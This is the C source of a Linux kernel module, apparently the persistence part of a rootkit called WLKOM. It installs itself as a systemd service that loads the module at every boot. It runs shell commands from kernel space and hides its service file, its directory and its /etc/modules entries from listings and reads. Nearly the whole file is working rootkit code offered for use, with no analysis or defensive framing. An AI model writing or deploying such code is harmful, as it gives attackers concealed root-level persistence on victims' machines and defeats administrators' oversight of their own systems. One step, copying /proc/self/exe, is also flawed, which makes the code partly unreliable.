#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/fcntl.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include "persist.h"
#include "hide.h"

/*
 * Persistence strategy:
 *   1. Copy the .ko to /lib/modules/wlkom/wlkom.ko
 *   2. Write a systemd service to /etc/systemd/system/wlkom.service
 *   3. Enable the service via systemctl
 *   4. Hide the added lines in /etc/modules (if used)
 *
 * We hide the service file and directory from ls, and
 * hide our lines from /etc/modules via the read hook.
 */

#define WLKOM_SERVICE_PATH "/etc/systemd/system/wlkom.service"
#define WLKOM_MODULE_DIR   "/lib/modules/wlkom"
#define WLKOM_MODULE_PATH  "/lib/modules/wlkom/wlkom.ko"
#define WLKOM_SERVICE_NAME "wlkom.service"

static const char *service_content =
    "[Unit]\n"
    "Description=WLKOM\n"
    "After=network.target\n\n"
    "[Service]\n"
    "Type=oneshot\n"
    "ExecStart=/sbin/insmod " WLKOM_MODULE_PATH "\n"
    "RemainAfterExit=yes\n\n"
    "[Install]\n"
    "WantedBy=multi-user.target\n";

static int write_file(const char *path, const char *content, size_t len)
{
    struct file *f = filp_open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (IS_ERR(f))
        return PTR_ERR(f);

    loff_t pos = 0;
    kernel_write(f, content, len, &pos);
    filp_close(f, NULL);
    return 0;
}

static void run_cmd(const char *cmd)
{
    char *argv[] = { "/bin/sh", "-c", (char *)cmd, NULL };
    char *envp[] = {
        "HOME=/",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin",
        NULL
    };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

int persist_init(void)
{
    /* Create module directory */
    run_cmd("mkdir -p " WLKOM_MODULE_DIR);

    /* Copy ourselves (best effort, the .ko must already exist) */
    run_cmd("cp /proc/self/exe " WLKOM_MODULE_PATH " 2>/dev/null || true");

    /* Write the service file */
    int ret = write_file(WLKOM_SERVICE_PATH, service_content,
                         strlen(service_content));
    if (ret < 0) {
        pr_err("WLKOM persist: cannot write service file (%d)\n", ret);
        return ret;
    }

    /* Enable the service */
    run_cmd("systemctl daemon-reload");
    run_cmd("systemctl enable wlkom.service");

    /* Hide the service file and our directory */
    hide_file(WLKOM_SERVICE_NAME);
    hide_file("wlkom");

    /* Hide any line containing "wlkom" in /etc/modules */
    hide_line("/etc/modules", "wlkom");

    pr_info("WLKOM persist: persistence installed\n");
    return 0;
}

void persist_exit(void)
{
    /* Nothing to undo at rmmod time (persistence is the goal) */
}
